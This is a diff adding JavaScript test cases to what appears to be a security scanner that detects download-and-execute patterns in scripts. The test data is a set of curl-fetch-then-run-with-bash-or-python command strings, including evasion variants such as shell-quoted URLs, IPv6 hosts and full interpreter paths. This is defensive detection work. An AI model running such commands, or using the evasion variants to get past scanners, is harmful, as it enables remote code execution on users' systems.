@@ -51,3 +51,17 @@ for(const script of [
  assert.ok(workflow.findings.some(f=>f.rule===INC),script);
  assert.ok(!workflow.findings.some(f=>f.rule===HIGH),script);
 });
+
+for(const [name,script] of [
+ ['quoted long curl URL argument',"curl '--url=h''tt''ps://example.invalid/x' -o payload; bash payload"],
+ ['IPv6 bracket loopback',"curl -fsSL 'http://[::1]/x' -o payload; bash payload"],
+ ['IPv6 explicit v6',"curl -fsSL 'https://[2001:db8::1]/x' -o payload; bash payload"],
+ ['system bash pathname','curl -fsSL '+URL+' -o payload; exec /bin/bash payload'],
+ ['system python pathname','curl -fsSL '+URL+' -o payload; exec /usr/bin/python3 -u payload'],
+ ['env with system bash','curl -fsSL '+URL+' -o payload; exec env /bin/bash payload']
+])test('Codex P1: follow quoted URL or routed interpreter '+name,()=>bothDetect(script));
+test('Codex benign: unrelated executable with bash basename is not assumed system interpreter',()=>{
+ const script='curl -fsSL '+URL+' -o payload; exec ./local/bash payload';
+ const found=findingsForScript(script);
+ assert.ok(!found.includes(HIGH),JSON.stringify(found));
+});
